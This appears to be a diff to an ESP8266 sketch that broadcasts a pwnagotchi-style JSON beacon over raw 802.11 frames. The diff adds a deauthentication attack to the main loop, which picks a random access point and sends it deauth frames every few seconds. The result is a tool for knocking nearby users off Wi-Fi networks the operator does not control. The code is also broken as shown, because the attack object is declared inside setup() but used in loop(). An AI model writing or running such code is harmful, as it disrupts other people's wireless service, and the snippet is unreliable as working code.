@@ -1,4 +1,5 @@
 #include "raw80211.h" // will be included in the repo
+#include "deauth.h" // also included
 #include <ESP8266WiFi.h> // this should be included with the esp8266 libs
 
 // if you ever have problems with a library being in one or more places,
@@ -48,12 +49,13 @@ const char* jsonPayload = "{"
     "\"pwnd_tot\": 0, "
     "\"session_id\": \"84:f3:eb:58:95:bd\""
     "\"uptime\": 1, "
-    "\"version\": \"v0.1.0-alpha\""
+    "\"version\": \"v0.2.1-alpha\""
 "}";
 
 // main function
 void setup() {
   Serial.begin(115200);
+  DeauthAttack deauthAttack;
   Raw80211::init(bssid, channel);
   Raw80211::start();
   Raw80211::register_cb(on_packet);
@@ -103,16 +105,20 @@ void decompressPayload(const char* input, char* output) {
 
 // this is the looping function that sends the payload
 void loop() {
-  Serial.begin(115200);
   char compressedPayload[256];
   compressPayload(jsonPayload, compressedPayload);
   const uint8_t* payloadData = reinterpret_cast<const uint8_t*>(jsonPayload);
+  // get random ap
+  deauthAttack.selectRandomAP();
+  // send payload
   Raw80211::send(payloadData, strlen(jsonPayload));
-  delay(5000); // Delayed between each payload by ms, in this case 500
+  delay(5000);
+  // deauthing the ap
+  deauthAttack.startRandomDeauth();
+  delay(5000);
 }
 
 void on_packet(const wifi_ieee80211_mac_hdr_t *hdr, signed int rssi, const uint8_t *buff, uint16_t buff_len) {
-    Serial.begin(115200);
 
     const uint8_t *payloadData = buff;
     uint16_t payloadLength = buff_len;
